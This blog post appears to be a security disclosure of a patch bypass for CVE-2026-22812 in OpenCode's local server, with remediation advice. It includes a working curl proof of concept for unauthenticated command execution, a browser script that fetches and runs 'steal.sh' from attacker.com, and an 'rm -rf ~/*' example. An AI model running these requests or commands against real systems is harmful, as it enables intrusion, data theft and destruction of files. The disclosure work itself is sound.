---
layout: post
title: "OpenCode CVE-2026-22812 Bypass - RCE Demonstration"
date: 2026-01-18 14:00:00 +0000
categories: [cve, vulnerability-research, rce, security]
description: "Critical vulnerability bypass analysis - CVE-2026-22812 patches can be bypassed for unauthenticated Remote Code Execution"
---

# OpenCode CVE-2026-22812 Bypass - RCE Demonstration

## Researchers
- **Rick Larabee**
- **Chowdhury Faizal Ahammed**

## Executive Summary

**CRITICAL VULNERABILITY CONFIRMED**: The patches applied to fix CVE-2026-22812 can be bypassed, allowing unauthenticated Remote Code Execution (RCE).

- **CVE ID**: CVE-2026-22812
- **GHSA ID**: GHSA-vxw4-wv6m-9hhh
- **Severity**: CVSS 8.8 (High)
- **Status**: ⚠️ **BYPASS SUCCESSFUL** - Patches are insufficient

## Vulnerability Analysis

### Original Vulnerability (Patched in v1.0.216)

The original vulnerability allowed unauthenticated RCE via three exposed HTTP endpoints:

1. `POST /session/:id/shell` - Execute shell commands
2. `POST /pty` - Create interactive terminal sessions
3. `GET /file/content?path=` - Read arbitrary files

### Patches Applied (INSUFFICIENT)

#### 1. Optional Basic Authentication (server.ts:85-90)

```typescript
.use((c, next) => {
  const password = Flag.OPENCODE_SERVER_PASSWORD
  if (!password) return next()  // ⚠️ NO AUTH IF NOT SET!
  const username = Flag.OPENCODE_SERVER_USERNAME ?? "opencode"
  return basicAuth({ username, password })(c, next)
})
```

**Issue**: Authentication is completely OPTIONAL. If `OPENCODE_SERVER_PASSWORD` is not set (default), the server runs with NO authentication.

#### 2. CORS Restrictions (server.ts:109-128)

```typescript
cors({
  origin(input) {
    if (!input) return
    if (input.startsWith("http://localhost:")) return input  // ⚠️ ANY PORT!
    if (input.startsWith("http://127.0.0.1:")) return input  // ⚠️ ANY PORT!
    if (input === "tauri://localhost" || input === "http://tauri.localhost") return input
    if (/^https:\/\/([a-z0-9-]+\.)*opencode\.ai$/.test(input)) {
      return input
    }
    if (_corsWhitelist.includes(input)) {
      return input
    }
    return
  },
})
```

**Issue**: While no longer allowing `origin: *`, the CORS policy allows ANY port on localhost/127.0.0.1, enabling bypass from other local web servers.

## Bypass Vectors

### Vector #1: No Authentication by Default

The `OPENCODE_SERVER_PASSWORD` environment variable is not set by default:

```typescript
// flag.ts:23
export const OPENCODE_SERVER_PASSWORD = process.env["OPENCODE_SERVER_PASSWORD"]
```

**Proof**:

```bash
$ echo "OPENCODE_SERVER_PASSWORD: $OPENCODE_SERVER_PASSWORD"
OPENCODE_SERVER_PASSWORD:

$ opencode serve --port 4096 --print-logs
Warning: OPENCODE_SERVER_PASSWORD is not set; server is unsecured.
opencode server listening on http://127.0.0.1:4096
```

### Vector #2: CORS Bypass via Localhost

The CORS policy allows requests from ANY localhost port:
- ✅ `http://localhost:3000` → allowed
- ✅ `http://localhost:8080` → allowed
- ✅ `http://127.0.0.1:*` → allowed

This means any local web application can make authenticated requests to the OpenCode server.

### Vector #3: Vulnerable Endpoints Still Accessible

All three dangerous endpoints remain accessible without authentication:

1. **Shell Command Execution** (`/session/:id/shell`)
   - Location: `packages/opencode/src/server/routes/session.ts:803-833`
   - No authentication check
   - Direct command execution

2. **PTY Sessions** (`/pty`)
   - Location: `packages/opencode/src/server/routes/pty.ts:33-56`
   - Creates interactive terminals
   - No authentication required

3. **File Reading** (`/file/content`)
   - Location: `packages/opencode/src/server/routes/file.ts:147-174`
   - Arbitrary file access
   - No path traversal protection

## Proof of Concept Exploitation

### Step 1: Verify Server is Unauthenticated

```bash
curl -s http://127.0.0.1:4096/path | jq .
```

**Expected Output** (no auth required):

```json
{
  "home": "/Users/raj",
  "state": "/Users/raj/.local/state/opencode",
  "config": "/Users/raj/.config/opencode",
  "worktree": "/Users/raj/opencode",
  "directory": "/Users/raj/opencode"
}
```

### Step 2: Create Session

```bash
SESSION_ID=$(curl -s -X POST "http://127.0.0.1:4096/session" \
  -H "Content-Type: application/json" -d '{}' | jq -r '.id')

echo "Session ID: $SESSION_ID"
```

**Result**: `Session ID: ses_4334d57a8ffekQkuH6rZ26fb0F`

### Step 3: Execute Arbitrary Commands (RCE)

```bash
curl -s -X POST "http://127.0.0.1:4096/session/$SESSION_ID/shell" \
  -H "Content-Type: application/json" \
  -d '{"agent": "build", "command": "whoami && echo RCE_SUCCESS"}'
```

**Result** (RCE ACHIEVED):

```json
{
  "info": {
    "id": "msg_bccb2f1b4001w2bWEsJP7rwyVd",
    "sessionID": "ses_4334d57a8ffekQkuH6rZ26fb0F",
    "role": "assistant"
  },
  "parts": [{
    "type": "tool",
    "tool": "bash",
    "state": {
      "status": "completed",
      "input": {"command": "whoami && echo RCE_SUCCESS"},
      "output": "raj\nRCE_SUCCESS\n"
    }
  }]
}
```

### Step 4: Demonstrate Impact - Write Malicious File

```bash
curl -s -X POST "http://127.0.0.1:4096/session/$SESSION_ID/shell" \
  -H "Content-Type: application/json" \
  -d '{"agent": "build", "command": "echo PWNED_BY_CVE-2026-22812_BYPASS > /tmp/pwned.txt && cat /tmp/pwned.txt"}'
```

**Result**: File `/tmp/pwned.txt` created with content `PWNED_BY_CVE-2026-22812_BYPASS`

### Step 5: Create PTY Session for Interactive Shell

```bash
curl -s -X POST "http://127.0.0.1:4096/pty" \
  -H "Content-Type: application/json" \
  -d '{"cwd": "/tmp"}' | jq .
```

**Result**: Interactive terminal session created with full shell access

## Attack Scenarios

### Scenario 1: Browser-Based Attack (CORS Bypass)

If a user has both:
- OpenCode server running on `localhost:4096`
- Any web application on `localhost:3000` (or any port)

Then a malicious page on `localhost:3000` can execute JavaScript to:

```javascript
// Create session
const response = await fetch('http://localhost:4096/session', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: '{}'
});
const {id} = await response.json();

// Execute RCE
await fetch(`http://localhost:4096/session/${id}/shell`, {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({
    agent: 'build',
    command: 'curl -s http://attacker.com/steal.sh | bash'
  })
});
```

### Scenario 2: Local Privilege Escalation

Any npm package or compromised application can reach the server:

```javascript
const http = require('http');

// Exploit OpenCode RCE
const exploit = JSON.stringify({
  agent: 'build',
  command: 'rm -rf ~/* # Malicious command'
});

http.request({
  hostname: '127.0.0.1',
  port: 4096,
  path: '/session',
  method: 'POST'
}, (res) => {
  // Parse session ID and execute command
}).end('{}');
```

### Scenario 3: Network Attack (with --mdns flag)

If server started with `--mdns`:
- Server binds to `0.0.0.0` (all interfaces)
- Advertised via Bonjour/mDNS
- Accessible from entire local network
- **Remote unauthenticated RCE**

## Impact Assessment

### Confidentiality: HIGH
- Read arbitrary files from filesystem
- Access sensitive credentials, keys, source code
- Dump environment variables and secrets

### Integrity: HIGH
- Execute arbitrary commands
- Modify/delete files
- Install malware/backdoors
- Tamper with git repositories

### Availability: HIGH
- Delete critical files
- Kill processes
- Fill disk space
- Denial of service

## Affected Versions

- All versions where `OPENCODE_SERVER_PASSWORD` is not set (default configuration)
- Includes patched version 1.0.216+
- **Current version tested: 1.1.25** ✅ VULNERABLE

## Remediation

### Immediate Mitigations

1. **Set Server Password** (REQUIRED):
   ```bash
   export OPENCODE_SERVER_PASSWORD='your-strong-password-here'
   opencode serve --port 4096
   ```

2. **Restrict CORS** to specific origins only:
   ```bash
   opencode serve --cors https://trusted-domain.com
   ```

3. **Bind to localhost only** (default, but verify):
   ```bash
   opencode serve --hostname 127.0.0.1
   ```

4. **Never use --mdns** in untrusted networks

### Required Code Fixes

1. **Make authentication MANDATORY** by default:
   ```typescript
   .use((c, next) => {
     const password = Flag.OPENCODE_SERVER_PASSWORD
     if (!password) {
       // REQUIRE password instead of allowing bypass
       throw new HTTPException(401, {
         message: 'OPENCODE_SERVER_PASSWORD must be set'
       })
     }
     const username = Flag.OPENCODE_SERVER_USERNAME ?? "opencode"
     return basicAuth({ username, password })(c, next)
   })
   ```

2. **Restrict CORS to specific ports**:
   ```typescript
   // Only allow official OpenCode web UI, not all ports
   if (input === "http://localhost:3000") return input  // Official port only
   if (input === "tauri://localhost") return input
   ```

3. **Add authentication to dangerous endpoints**:
   - Require token-based auth for /session/:id/shell
   - Implement permission checks for /pty creation
   - Add path validation for /file/content

4. **Generate default password on first run**:
   ```typescript
   if (!process.env.OPENCODE_SERVER_PASSWORD) {
     const randomPassword = generateSecurePassword()
     console.warn(`Auto-generated password: ${randomPassword}`)
     process.env.OPENCODE_SERVER_PASSWORD = randomPassword
   }
   ```

## Timeline

- **2025-11-17**: Original CVE-2026-22812 reported
- **2026-01-12**: Public advisory published
- **2026-01-??**: Patches applied in v1.0.216
- **2026-01-17**: Bypass discovered and confirmed
- **2026-01-17**: This PoC created

## Conclusion

**The patches applied to fix CVE-2026-22812 are INSUFFICIENT.**

The vulnerability can still be exploited through:
1. Default unauthenticated server configuration
2. CORS bypass via localhost origins
3. Unchanged dangerous endpoint access

**Recommendation**: Apply additional security hardening immediately as described in the Remediation section.

---

*This research demonstrates the importance of defense-in-depth and proper security defaults. Authentication should never be optional for services executing arbitrary code.*
